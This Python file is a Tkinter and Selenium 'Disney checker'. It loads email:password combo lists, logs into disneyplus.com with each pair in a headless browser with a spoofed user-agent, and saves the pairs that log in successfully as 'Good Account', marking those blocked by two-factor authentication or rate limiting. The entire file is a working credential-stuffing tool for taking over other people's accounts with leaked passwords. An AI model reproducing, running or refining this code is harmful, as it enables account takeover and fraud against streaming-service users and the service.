import time
import os
import requests
import tkinter
from functools import partial
from split_combos import split_combos
from tkinter import *
from tkinter import ttk
from bs4 import BeautifulSoup as soup
from selenium.common.exceptions import NoSuchElementException, ElementClickInterceptedException, InvalidSessionIdException
from selenium.webdriver.chrome.options import Options
from selenium import webdriver
from pathlib import Path

class disney_checker():

	def __init__(self, root):
		self.infobox = Text(root, bg='goldenrod3',font=('Arial',11),height = 360, width=460)
		self.file_directory = str(Path(__file__).parent)+'/disney'
		self.page = 'https://www.disneyplus.com/login'
		self.users = []
		self.passwords = []
		self.Two_Factor = False
		self.browser_options = Options()
		self.browser_options.add_argument = ('user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36')		
		self.browser_options.headless = True
		
	def split_combo_file(self,root):
		self.split_combos = split_combos(root)
		self.split_combos
	
	def draw_checker_button(self,root):
		self.start_checker = Button(root, text = 'Start Checker', font=('Arial', 13), command = partial(self.check_the_accounts,root))
		self.start_checker.place(x=328,y=560)
			
	def draw_the_infobox(self):
		self.infobox.place(x=58,y=288,width=681,height=250)
		
	def split_username_and_password(self):
		os.makedirs('accounts',exist_ok=True)
		with open(self.file_directory, 'r') as disney:
			for line in disney.readlines():
					self.users.append(line.split(':')[0].strip())
					self.passwords.append(line.split(':')[1].strip())
									
	def check_the_accounts(self,root):
		self.draw_the_infobox()
		self.split_username_and_password()
		self.start_checker.destroy()
		self.split_combos.destroy_split_button()
		self.split_combos.destroy_info_label()
		checking_progress_label = Label(root,bg='goldenrod3', text = 'Opening Browser...',font=('Arial',12))
		checking_progress_label.place(x=68,y=238)
		index = 0
		error_on_first_page = False
		while index != len(self.users):
			with open('accounts/disney_working_accounts','a') as account_results:
				try:
					self.infobox.insert(END,'Trying Combo {} out of {}'.format(index+1, len(self.users)))
					checking_progress_label['text']='Opening Browser...'
					root.update_idletasks()
					browser = webdriver.Chrome(options = self.browser_options)
					browser.set_window_size(500,700)
					browser.get(self.page)
					time.sleep(9)
					email_input_box = browser.find_element_by_xpath('//*[@id="email"]')
					continue_button = browser.find_element_by_xpath('//*[@id="dssLogin"]/div[2]/button')					
					email_input_box.send_keys(self.users[index])
					checking_progress_label['text']='Entering Email...'
					root.update_idletasks()
					if browser.find_elements_by_xpath('//*[@id="onetrust-reject-all-handler"]'):
						gdpr_reject_all = browser.find_element_by_xpath('//*[@id="onetrust-reject-all-handler"]')
						gdpr_reject_all.click()
					continue_button.click()
					time.sleep(3)
					if browser.find_elements_by_xpath('/html/body/div[3]/div/div/h4'):
						email_error = browser.find_element_by_xpath('/html/body/div[3]/div/div/h4').text
						if "We couldn't find an account for that email" in str(email_error):
							self.infobox.insert(END,' | {}:{} ---> Invalid Email\n'.format(self.users[index],self.passwords[index]))
							error_on_first_page = True
					if browser.find_elements_by_xpath('//*[@id="onboarding_index"]/div/div/form/h3'):
						two_factor_authentication = browser.find_element_by_xpath('//*[@id="onboarding_index"]/div/div/form/h3').text
						if 'Check your email inbox' in str(two_factor_authentication):
							self.infobox.insert(END," | {}:{} ---> Protected by Two-Factor Authentication\n".format(self.users[index],self.passwords[index]))
							error_on_first_page = True
					if error_on_first_page != True:
						password_input_box = browser.find_element_by_xpath('//*[@id="password"]')
						login_button = browser.find_element_by_xpath('//*[@id="dssLogin"]/div/button')
						password_input_box.send_keys(self.passwords[index])
						checking_progress_label['text']='Entering Password...'
						root.update_idletasks()
						login_button.click()
						checking_progress_label['text']='Logging in...'
						root.update_idletasks()
						time.sleep(5)
						if browser.find_elements_by_xpath('//*[@id="app_index"]/div[3]/div/div/h4'):
							travelling_warning = browser.find_element_by_xpath('//*[@id="app_index"]/div[3]/div/div/h4').text
							if 'Looks like' in str(travelling_warning):
								self.infobox.insert(END,' | {}:{} ---> Success! (Travelling)\n'.format(self.users[index],self.passwords[index]))
						if browser.find_elements_by_xpath('//*[@id="password__error"]'):
							password_or_429_error = browser.find_element_by_xpath('//*[@id="password__error"]').text
							if 'Incorrect Password' in str(password_or_429_error):
								self.infobox.insert(END," | {}:{} ---> Password is incorrect\n".format(self.users[index],self.passwords[index]))
							if 'Due to' in str(password_or_429_error):
								#print(password_or_429_error)
								self.infobox.insert(END," | Login Blocked.\n")
						if browser.find_elements_by_xpath('//*[@id="remove-main-padding_index"]/div/div/section/h2'):
							valid = browser.find_element_by_xpath('//*[@id="remove-main-padding_index"]/div/div/section/h2').text
							if "Who's watching?" in str(valid):
								self.infobox.insert(END," | {}:{} ---> Success!\n".format(self.users[index],self.passwords[index]))
								account_results.write('{}:{} ---> Good Account\n'.format(self.users[index],self.passwords[index]))
					index += 1
					error_on_first_page = False
					browser.close()
				except Exception as e:
					self.infobox.insert(END,'\n{}'.format(e))
					break

